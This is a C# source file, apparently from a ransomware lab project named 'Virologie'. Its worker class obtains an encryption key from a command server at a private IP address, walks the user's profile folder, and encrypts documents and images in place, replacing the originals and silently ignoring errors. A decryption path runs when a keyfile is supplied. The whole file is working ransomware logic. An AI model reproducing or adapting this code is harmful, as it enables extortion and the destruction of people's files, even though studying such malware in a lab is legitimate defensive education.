using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.ComponentModel;
using System.IO;

namespace Virologie
{
    public enum EncryptError
    {
        ServerNotFound,
        Other,
    }

    class EncryptWorker : BackgroundWorker
    {
        private readonly string _keyfile;

        private string _fileBuf1 = "";
        private string _fileBuf2 = "";
        private bool _switchFiles = false;
        public string CurrentFile
        {
            get
            {
                return _switchFiles ? _fileBuf1 : _fileBuf2;
            }
            private set
            {
                if (_switchFiles)
                    _fileBuf2 = value;
                else
                    _fileBuf1 = value;
            }
        }

        public void SwitchFiles()
        {
            _switchFiles = !_switchFiles;
        }

        public EncryptWorker(String keyfile = null)
        {
            _keyfile = keyfile;
            DoWork += worker_DoWork;
            WorkerReportsProgress = true;
        }

        private void worker_DoWork(object sender, DoWorkEventArgs args)
        {
            var explorer = new FileExplorer();
            FileEncrypter encrypter = (_keyfile == null)
                ? CryptoKeyManager.CreateFromServer("http://192.168.56.102:1234/")
                : CryptoKeyManager.CreateFromFile(_keyfile);

            CryptoKeyManager.SaveGUID();
            explorer.ApplyTo(Environment.GetEnvironmentVariable("USERPROFILE"),
                new[] { "*.jpg", "*.png", "*.pdf", "*.odt", ".odf", "*.doc", "*.xls", "*.ppt", "*.docx", "*.xlsx", "*.pptx" },
                CreateFileAction(encrypter));
        }

        private FileExplorer.FileAction CreateFileAction(FileEncrypter encrypter)
        {
            return file =>
            {
                try
                {
                    if (_keyfile != null)
                        encrypter.Decrypt(file);
                    else
                        encrypter.Encrypt(file);

                    FileExplorer.ReplaceFile(file);
                }
                // ReSharper disable once EmptyGeneralCatchClause
                catch (Exception)
                {}

                ReportProgress(0);
                CurrentFile = file;
                SwitchFiles();
            };
        }
    }
}
